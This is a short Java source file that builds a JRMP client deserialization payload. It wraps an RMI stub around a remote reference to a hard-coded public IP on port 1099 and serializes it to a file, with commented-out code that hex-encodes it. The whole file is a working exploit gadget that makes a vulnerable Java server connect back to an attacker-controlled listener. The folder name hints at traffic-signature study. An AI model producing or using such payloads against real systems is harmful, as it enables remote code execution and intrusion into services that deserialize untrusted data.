package com.pinger.javasec.common;

import lombok.SneakyThrows;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.io.*;
import java.rmi.server.ObjID;
import java.util.Random;

/**
 * @author : p1n93r
 * @date : 2021/7/8 14:36
 */
public class JRMPClient {

    public static Object getPayload(String host,int port){
        ObjID id = new ObjID((new Random()).nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub payload = new RMIConnectionImpl_Stub(ref);
        return payload;
    }





    @SneakyThrows
    public static void main(String[] args){
        Object payload = getPayload("49.234.105.98", 1099);
        FileOutputStream fileOutputStream = new FileOutputStream(new File("C:\\Users\\18148\\Desktop\\tmp\\流量特征\\JRMP"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(payload);
        fileOutputStream.close();
        objectOutputStream.close();


//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//        objectOutputStream.writeObject(payload);
//        byte[] bytes = byteArrayOutputStream.toByteArray();
//        // 将payload进行16进行存储
//        String res = HexUtil.encodeHexStr(bytes);
//        System.out.println(res);
    }
}
